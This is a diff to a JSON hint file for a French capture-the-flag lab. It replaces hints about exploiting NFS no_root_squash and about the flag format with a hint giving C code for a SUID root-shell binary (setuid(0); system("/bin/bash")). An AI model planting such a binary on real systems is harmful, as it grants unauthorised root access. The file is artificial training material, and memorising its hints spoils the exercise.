@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
+    "title": "Code du binaire SUID",
     "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter nfs-no-root-squash."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
-    "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "content": "int main() { setuid(0); system(\"/bin/bash\"); }"
   }
 ]
